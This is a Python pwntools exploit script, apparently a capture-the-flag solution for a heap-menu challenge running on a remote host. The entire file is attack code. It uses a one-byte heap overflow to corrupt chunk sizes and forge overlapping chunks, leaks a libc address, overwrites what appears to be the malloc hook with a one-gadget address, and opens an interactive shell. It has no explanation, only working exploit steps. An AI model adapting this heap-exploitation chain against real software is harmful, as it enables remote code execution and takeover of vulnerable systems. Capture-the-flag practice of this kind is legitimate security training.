from pwn import *

#s = remote('192.168.33.10',1234)
s = remote('202.120.7.204',127)
def alloc(size):
  s.recvuntil('Command: ')
  s.sendline('1')
  s.recvuntil('Size:')
  s.sendline(str(size))

def update(index, size, dat):
  s.recvuntil('Command: ')
  s.sendline("2")
  s.recvuntil('Index: ')
  s.sendline(str(index))
  s.recvuntil('Size: ')
  s.sendline(str(size))
  s.recvuntil('Content: ')
  s.send(dat)

def delete(index):
  s.recvuntil('Command: ')
  s.sendline('3')
  s.recvuntil('Index: ')
  s.sendline(str(index))

def view(index):
  s.recvuntil('Command: ')
  s.sendline('4')
  s.recvuntil('Index: ')
  s.sendline(str(index))

raw_input()
alloc(0x18)
alloc(0x18)
alloc(0x18)
alloc(0x58)
alloc(0x58)
alloc(0x18)

alloc(0x18)
alloc(0x18)
alloc(0x48)
update(1,0x19,"A"*0x18+p8(0xe1))
update(0,0x19,"B"*0x18+p8(0x41))
delete(1)
alloc(0x30)
update(1,0x20,"A"*0x10+p64(0)+p64(0xe1))
delete(2)
view(1)
libc = u64(s.recvuntil('1.')[0x2a:0x2a+6]+"\x00\x00") - 0x399b58#0x3c4b78
log.info("LIBC : 0x%x"%libc)
update(6,0x19,"C"*0x18+p8(0x41))
update(8,0x20,"C"*0x10+p64(0)+p64(0x31))
alloc(0x48)
delete(2)
delete(7)
delete(8)
alloc(56)
fake_chunk = libc+0x399b2d - 0x8 # 0x3c4b4d
update(2,0x28,"C"*0x10+p64(0)+p64(0x51)+p64(fake_chunk))
alloc(0x50)
alloc(0x50)
delete(7)
delete(8)
alloc(0x48)
alloc(0x48)
update(8,43,"A"*35+p64(libc+0x399af0-0x23)) # 0x3c4aed
alloc(64)
update(9,64,"A"*0x13+p64(libc+0x3f35a)+"A"*43)
s.interactive()
